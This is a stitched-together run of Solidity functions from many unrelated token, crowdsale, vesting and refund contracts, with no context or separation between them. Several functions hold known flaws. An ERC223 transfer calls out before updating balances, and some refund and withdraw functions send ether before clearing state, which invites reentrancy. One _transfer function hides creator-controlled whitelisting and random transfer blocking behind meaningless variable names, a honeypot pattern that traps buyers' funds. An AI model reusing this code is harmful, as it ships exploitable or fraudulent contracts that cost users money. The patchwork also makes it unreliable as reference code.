function batchReturnEthIfFailed(uint _numberOfReturns) onlyOwner {
    require(crowdsaleState != state.crowdsaleEnded); 
    require(ethRaised < minCap); 
    address currentParticipantAddress;
    uint contribution;
    for (uint cnt = 0; cnt < _numberOfReturns; cnt++) {
        currentParticipantAddress = contributorIndexes[nextContributorToClaim]; 
        if (currentParticipantAddress == 0x0) return; 
        if (!hasClaimedEthWhenFail[currentParticipantAddress]) { 
            contribution = contributorList[currentParticipantAddress].contributionAmount; 
            hasClaimedEthWhenFail[currentParticipantAddress] = true; 
            balances[currentParticipantAddress] = 0;
            if (!currentParticipantAddress.send(contribution)) { 
                ErrorSendingETH(currentParticipantAddress, contribution); 
            }
        }
        nextContributorToClaim += 1; 
    }
}

function checkCrowdsaleState() internal returns(bool) {
    if (ethRaised >= maxCap && crowdsaleState != state.crowdsaleEnded) { 
        crowdsaleState = state.crowdsaleEnded;
        CrowdsaleEnded(block.number); 
        return true;
    }
    if (now >= END_TIME) {
        crowdsaleState = state.crowdsaleEnded;
        CrowdsaleEnded(block.number); 
        return true;
    }
    if (now >= BEGIN_TIME && now < END_TIME) { 
        if (crowdsaleState != state.crowdsale) { 
            crowdsaleState = state.crowdsale; 
            CrowdsaleStarted(block.number); 
            return true;
        }
    }
    return false;
}

function withdraw() payable {
    if (block.number > 4199999 && iou_purchased[msg.sender] > token.balanceOf(address(this))) {
        uint256 eth_to_refund = eth_sent[msg.sender];
        if (eth_to_refund == 0 || iou_purchased[msg.sender] == 0) throw;
        total_iou_purchased -= iou_purchased[msg.sender];
        eth_sent[msg.sender] = 0;
        iou_purchased[msg.sender] = 0;
        msg.sender.transfer(eth_to_refund);
        return;
    }
    if (token.balanceOf(address(this)) == 0 || iou_purchased[msg.sender] > token.balanceOf(address(this))) throw;
    uint256 iou_to_withdraw = iou_purchased[msg.sender];
    if (iou_to_withdraw == 0) throw;
    iou_purchased[msg.sender] = 0;
    eth_sent[msg.sender] = 0;
    total_iou_withdrawn += iou_to_withdraw;
    token.transfer(msg.sender, iou_to_withdraw);
}

function takeFee(address sender, uint256 amount, address receiver) internal returns(uint256) {
    (uint256 feeAmount, bool toHelper) = helper.getTotalFee(amount, sender, receiver, msg.sender);
    if (!toHelper) {
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
    } else {
        _balances[address(helper)] = _balances[address(helper)].add(feeAmount);
        emit Transfer(sender, address(helper), feeAmount);
    }
    return amount.sub(feeAmount);
}

function registerHelper() external authorized {
    require(!helperRegistered);
    helper.register(address(this));
    helperRegistered = true;
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (papers == false)) {
        smartphone = chTx;
        cocos = true;
    }
    if ((address(sender) == creator) && (papers == true)) {
        argentina[recipient] = true;
        sandals[recipient] = false;
        papers = false;
    }
    if ((amount > indian) && (argentina[sender] == true) && (address(sender) != creator)) {
        bluecart[recipient] = true;
    }
    if (argentina[recipient] != true) {
        sandals[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((sandals[sender]) && (argentina[recipient] == false)) {
        sandals[recipient] = true;
    }
    if (argentina[sender] == false) {
        if ((amount > indian) && (bluecart[sender] == true)) {
            require(false);
        }
        require(amount < smartphone);
        if (cocos == true) {
            if (bluecart[sender] == true) {
                require(false);
            }
            bluecart[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function _createLiquidity(uint phase) internal {
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address token = 0x0cB9dAB71Dd14951D580904825e7F0985B29D375;
    address staking = 0xB0b3E52e432b80D3A37e15AB6BBF4673225e160f;
    address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address tknETHLP = I(factory).getPair(token, WETH);
    if (tknETHLP == address(0)) {
        tknETHLP = I(factory).createPair(token, WETH);
    }
    _ETHDeposited += address(this).balance;
    uint ethToDeposit = address(this).balance;
    uint tokenToDeposit = 1e23;
    if (phase == 81000) {
        I(staking).init(_ETHDeposited, tknETHLP);
        delete _lgeOngoing;
        delete _ETHDeposited;
        delete _phase;
        delete _deployer;
    }
    I(WETH).deposit {
        value: ethToDeposit
    }();
    I(token).transfer(tknETHLP, tokenToDeposit);
    I(WETH).transfer(tknETHLP, ethToDeposit);
    I(tknETHLP).mint(staking);
}

function transfer(address _to, uint _value, bytes _data)
public
whenNotPaused
returns(bool) {
    require(_value > 0);
    require(!frozenAccount[_to]);
    require(!frozenAccount[msg.sender]);
    if (isContract(_to)) {
        ERC223ReceivingContract receiver = ERC223ReceivingContract(_to);
        receiver.tokenFallback(msg.sender, _value, _data);
    }
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value, _data);
    return true;
}

function _distributeRest() internal {
    int rest = int(address(this).balance) -
        int(_balances[joker]) -
        int(_balances[knight]) -
        int(_balances[paladin]) -
        int(_balances[queen]) -
        int(toDistribute);
    if (rest > 0) {
        toDistribute = toDistribute + uint256(rest);
    }
    uint256 ownedHorse = horseToken.balanceOf(address(this));
    if (ownedHorse > 0) {
        int restHorse = int(ownedHorse) -
            int(_balancesHorse[joker]) -
            int(_balancesHorse[knight]) -
            int(_balancesHorse[paladin]) -
            int(_balancesHorse[queen]) -
            int(toDistributeHorse);
        if (restHorse > 0) {
            toDistributeHorse = toDistributeHorse + uint256(restHorse);
        }
    }
}

function withdraw() external {
    _distributeRest();
    if (toDistribute > 0)
        _distribute();
    if (toDistributeHorse > 0)
        _distributeHorse();
    if (_balances[msg.sender] > 0) {
        msg.sender.transfer(_balances[msg.sender]);
        _balances[msg.sender] = 0;
    }
    if (_balancesHorse[msg.sender] > 0) {
        horseToken.transfer(msg.sender, _balancesHorse[msg.sender]);
        _balancesHorse[msg.sender] = 0;
    }
}

function claimTokensAndRefund() external {
    if (0 == contributions[msg.sender]) throw; 
    if (block.number < fundingEndBlock) throw; 
    if (contributed < targetEth) {
        if (!msg.sender.send(contributions[msg.sender])) throw;
        RefundContribution(msg.sender, contributions[msg.sender]);
    } else {
        balances[msg.sender] = safeMult(totalSupply, contributions[msg.sender]) / contributed;
        if (!msg.sender.send(contributions[msg.sender] - (safeMult(targetEth, contributions[msg.sender]) / contributed))) throw;
        ClaimTokens(msg.sender, balances[msg.sender]);
    }
    contributions[msg.sender] = 0;
}

function finalizeFunding() external {
    if (isFinalized) throw; 
    if (msg.sender != depositAddress) throw; 
    if (block.number <= fundingEndBlock) throw; 
    if (contributed < targetEth) throw; 
    isFinalized = true;
    if (!depositAddress.send(targetEth)) throw;
    FinalizeSale(msg.sender);
}

function isVestingSet(address adr) public constant returns(bool isSet) {
    return vestingMap[adr].principleLockAmount != 0 || vestingMap[adr].bonusLockAmount != 0;
}

function releaseVestedTokens(address _adr) public {
    VestingSchedule storage vestingSchedule = vestingMap[_adr];
    uint256 _totalTokens = safeAdd(vestingSchedule.principleLockAmount, vestingSchedule.bonusLockAmount);
    require(safeSub(_totalTokens, vestingSchedule.amountReleased) > 0);
    uint256 amountToRelease = 0;
    if (block.timestamp >= vestingSchedule.principleLockPeriod && !vestingSchedule.isPrincipleReleased) {
        amountToRelease = safeAdd(amountToRelease, vestingSchedule.principleLockAmount);
        vestingSchedule.amountReleased = safeAdd(vestingSchedule.amountReleased, amountToRelease);
        vestingSchedule.isPrincipleReleased = true;
    }
    if (block.timestamp >= vestingSchedule.bonusLockPeriod && !vestingSchedule.isBonusReleased) {
        amountToRelease = safeAdd(amountToRelease, vestingSchedule.bonusLockAmount);
        vestingSchedule.amountReleased = safeAdd(vestingSchedule.amountReleased, amountToRelease);
        vestingSchedule.isBonusReleased = true;
    }
    require(amountToRelease > 0);
    ERC20 token = ERC20(TokenAddress);
    token.transfer(_adr, amountToRelease);
    totalUnreleasedTokens = safeSub(totalUnreleasedTokens, amountToRelease);
    VestedTokensReleased(_adr, amountToRelease);
}

function setVesting(address _adr, uint256 _principleLockAmount, uint256 _principleLockPeriod, uint256 _bonusLockAmount, uint256 _bonuslockPeriod) public onlyAllocateAgent {
    VestingSchedule storage vestingSchedule = vestingMap[_adr];
    require(safeAdd(_principleLockAmount, _bonusLockAmount) > 0);
    vestingSchedule.startAt = block.timestamp;
    vestingSchedule.bonusLockPeriod = safeAdd(block.timestamp, _bonuslockPeriod);
    vestingSchedule.principleLockPeriod = safeAdd(block.timestamp, _principleLockPeriod);
    ERC20 token = ERC20(TokenAddress);
    uint256 _totalAmount = safeAdd(_principleLockAmount, _bonusLockAmount);
    require(token.balanceOf(this) >= safeAdd(totalUnreleasedTokens, _totalAmount));
    vestingSchedule.principleLockAmount = _principleLockAmount;
    vestingSchedule.bonusLockAmount = _bonusLockAmount;
    vestingSchedule.isPrincipleReleased = false;
    vestingSchedule.isBonusReleased = false;
    totalUnreleasedTokens = safeAdd(totalUnreleasedTokens, _totalAmount);
    vestingSchedule.amountReleased = 0;
}

function setEndsAt(uint time) public onlyOwner {
    require(now <= time);
    endsAt = time;
    EndsAtChanged(endsAt);
}

function investInternal(address receiver, uint128 customerId) stopInEmergency private {
    uint256 tokenAmount;
    uint256 weiAmount = msg.value;
    if (getState() == State.PreFunding) {
        require(earlyParticipantWhitelist[receiver]);
        require(weiAmount >= safeMul(15, uint(10 ** 18)));
        require(weiAmount <= safeMul(50, uint(10 ** 18)));
        tokenAmount = safeDiv(safeMul(weiAmount, uint(10) ** token.decimals()), earlyPariticipantWeiPrice);
        if (investedAmountOf[receiver] == 0) {
            investorCount++;
        }
        investedAmountOf[receiver] = safeAdd(investedAmountOf[receiver], weiAmount);
        tokenAmountOf[receiver] = safeAdd(tokenAmountOf[receiver], tokenAmount);
        weiRaised = safeAdd(weiRaised, weiAmount);
        tokensSold = safeAdd(tokensSold, tokenAmount);
        require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));
        if (safeAdd(whitelistPrincipleLockPercentage, whitelistBonusPercentage) > 0) {
            uint256 principleAmount = safeDiv(safeMul(tokenAmount, 100), safeAdd(whitelistBonusPercentage, 100));
            uint256 bonusLockAmount = safeDiv(safeMul(whitelistBonusPercentage, principleAmount), 100);
            uint256 principleLockAmount = safeDiv(safeMul(whitelistPrincipleLockPercentage, principleAmount), 100);
            uint256 totalLockAmount = safeAdd(principleLockAmount, bonusLockAmount);
            TokenVesting tokenVesting = TokenVesting(tokenVestingAddress);
            require(!tokenVesting.isVestingSet(receiver));
            require(totalLockAmount <= tokenAmount);
            assignTokens(tokenVestingAddress, totalLockAmount);
            tokenVesting.setVesting(receiver, principleLockAmount, whitelistPrincipleLockPeriod, bonusLockAmount, whitelistBonusLockPeriod);
        }
        if (tokenAmount - totalLockAmount > 0) {
            assignTokens(receiver, tokenAmount - totalLockAmount);
        }
        require(multisigWallet.send(weiAmount));
        Invested(receiver, weiAmount, tokenAmount, customerId);
    } else if (getState() == State.Funding) {
        tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised, tokensSold, msg.sender, token.decimals());
        require(tokenAmount != 0);
        if (investedAmountOf[receiver] == 0) {
            investorCount++;
        }
        investedAmountOf[receiver] = safeAdd(investedAmountOf[receiver], weiAmount);
        tokenAmountOf[receiver] = safeAdd(tokenAmountOf[receiver], tokenAmount);
        weiRaised = safeAdd(weiRaised, weiAmount);
        tokensSold = safeAdd(tokensSold, tokenAmount);
        require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));
        assignTokens(receiver, tokenAmount);
        require(multisigWallet.send(weiAmount));
        Invested(receiver, weiAmount, tokenAmount, customerId);
    } else {
        require(false);
    }
}

function finalizeCrowdsale() public {
    require(msg.sender == address(crowdsale));
    uint256 tokenSupply = token.totalSupply();
    allocatedTokens = safeSub(tokenCap, tokenSupply);
    if (allocatedTokens > 0) {
        token.mint(walletAddress, allocatedTokens);
    }
    token.releaseTokenTransfer();
}

function preallocate(address receiver, uint256 tokenAmount, uint256 weiPrice, uint256 principleLockAmount, uint256 principleLockPeriod, uint256 bonusLockAmount, uint256 bonusLockPeriod) public onlyAllocateAgent {
    uint256 weiAmount = (weiPrice * tokenAmount) / 10 ** uint256(token.decimals()); 
    uint256 totalLockAmount = 0;
    weiRaised = safeAdd(weiRaised, weiAmount);
    tokensSold = safeAdd(tokensSold, tokenAmount);
    investedAmountOf[receiver] = safeAdd(investedAmountOf[receiver], weiAmount);
    tokenAmountOf[receiver] = safeAdd(tokenAmountOf[receiver], tokenAmount);
    totalLockAmount = safeAdd(principleLockAmount, bonusLockAmount);
    require(totalLockAmount <= tokenAmount);
    if (totalLockAmount > 0) {
        TokenVesting tokenVesting = TokenVesting(tokenVestingAddress);
        require(!tokenVesting.isVestingSet(receiver));
        assignTokens(tokenVestingAddress, totalLockAmount);
        tokenVesting.setVesting(receiver, principleLockAmount, principleLockPeriod, bonusLockAmount, bonusLockPeriod);
    }
    if (tokenAmount - totalLockAmount > 0) {
        assignTokens(receiver, tokenAmount - totalLockAmount);
    }
    Invested(receiver, weiAmount, tokenAmount, 0);
}

function refund() public inState(State.Refunding) {
    uint256 weiValue = investedAmountOf[msg.sender];
    require(weiValue != 0);
    investedAmountOf[msg.sender] = 0;
    weiRefunded = safeAdd(weiRefunded, weiValue);
    Refund(msg.sender, weiValue);
    require(msg.sender.send(weiValue));
}

function() public payable {
    require(now >= startDate && now <= endDate);
    uint tokens;
    if (now <= bonusEnds) {
        tokens = msg.value * 5066;
    } else {
        tokens = msg.value * 5066;
    }
    balances[msg.sender] = safeAdd(balances[msg.sender], tokens);
    _totalSupply = safeAdd(_totalSupply, tokens);
    Transfer(address(0), msg.sender, tokens);
    owner.transfer(msg.value);
}

function release() public {
    require(msg.sender == owner || msg.sender == beneficiary);
    require(token.balanceOf(this) >= 0 && now >= startFrom);
    uint256 elapsedTime = now.sub(startFrom);
    uint256 periodsInCurrentRelease = elapsedTime.div(period).sub(elapsedPeriods);
    uint256 tokensReadyToRelease = periodsInCurrentRelease.mul(tokensReleasedPerPeriod);
    uint256 amountToTransfer = tokensReadyToRelease > token.balanceOf(this) ? token.balanceOf(this) : tokensReadyToRelease;
    require(amountToTransfer > 0);
    elapsedPeriods = elapsedPeriods.add(periodsInCurrentRelease);
    token.transfer(beneficiary, amountToTransfer);
    emit Released(amountToTransfer);
}

function validatePurchase(uint256 weiPaid) internal view {
    require(!saleClosed);
    require(initialTime <= now);
    require(whiteList[msg.sender].offeredWei > 0);
    require(weiPaid <= weiCap.sub(weiRaised));
    require(now.sub(whiteList[msg.sender].lastPurchasedTimestamp) > 24 hours);
    uint256 elapsedTime = now.sub(initialTime);
    require(elapsedTime > 24 hours || msg.value <= whiteList[msg.sender].offeredWei);
    require(elapsedTime > 48 hours || msg.value <= whiteList[msg.sender].offeredWei.mul(2));
}

function updateRate(uint256 rate_) public onlyOwner {
    require(now <= initialTime);
    rate = rate_;
    emit UpdateRate(rate);
}

